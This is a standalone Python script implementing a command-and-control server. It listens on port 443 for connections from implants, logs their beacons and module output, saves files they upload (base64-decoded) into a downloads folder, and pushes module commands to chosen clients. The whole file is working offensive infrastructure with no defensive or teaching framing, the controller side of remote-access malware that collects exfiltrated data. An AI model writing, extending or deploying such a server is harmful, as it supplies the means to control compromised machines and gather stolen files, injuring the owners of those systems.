#!/usr/bin/env python3

import socket
import threading
import json
import base64
import os
from datetime import datetime

class C2Server:
    def __init__(self, host='0.0.0.0', port=443):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.clients = {}
        self.running = False
        
    def start(self):
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.running = True
        print(f"[+] C2 Server started on {self.host}:{self.port}")
        print(f"[+] Waiting for incoming connections...")
        
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                threading.Thread(target=self.handle_client, args=(client_socket, addr), daemon=True).start()
            except Exception as e:
                if self.running:
                    print(f"[-] Error accepting connection: {e}")
                    
    def handle_client(self, client_socket, addr):
        client_id = f"{addr[0]}:{addr[1]}"
        self.clients[client_id] = client_socket
        print(f"[+] New connection from {client_id}")
        
        try:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                    
                try:
                    message = json.loads(data.decode())
                    self.process_message(client_id, message)
                except json.JSONDecodeError:
                    print(f"[-] Invalid JSON from {client_id}")
                    
        except Exception as e:
            print(f"[-] Error handling client {client_id}: {e}")
        finally:
            del self.clients[client_id]
            client_socket.close()
            print(f"[-] Connection closed from {client_id}")
            
    def process_message(self, client_id, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if message.get('type') == 'beacon':
            print(f"[{timestamp}] [{client_id}] Beacon received: {message.get('data', {})}")
            
        elif message.get('type') == 'result':
            print(f"[{timestamp}] [{client_id}] Module result: {message.get('module')}")
            print(f"[{timestamp}] [{client_id}] Output: {message.get('output', 'N/A')}")
            
        elif message.get('type') == 'error':
            print(f"[{timestamp}] [{client_id}] Error: {message.get('error')}")
            
        elif message.get('type') == 'file':
            filename = message.get('filename')
            content = base64.b64decode(message.get('content'))
            
            os.makedirs('downloads', exist_ok=True)
            with open(f'downloads/{filename}', 'wb') as f:
                f.write(content)
                
            print(f"[{timestamp}] [{client_id}] File received: {filename}")
            
    def send_command(self, client_id, module_id, args=None):
        if client_id not in self.clients:
            print(f"[-] Client {client_id} not found")
            return False
            
        command = {
            'type': 'command',
            'module_id': module_id,
            'args': args or {}
        }
        
        try:
            self.clients[client_id].send(json.dumps(command).encode())
            return True
        except Exception as e:
            print(f"[-] Error sending command to {client_id}: {e}")
            return False
            
    def stop(self):
        self.running = False
        self.server_socket.close()
        print("[+] C2 Server stopped")

if __name__ == "__main__":
    server = C2Server()
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()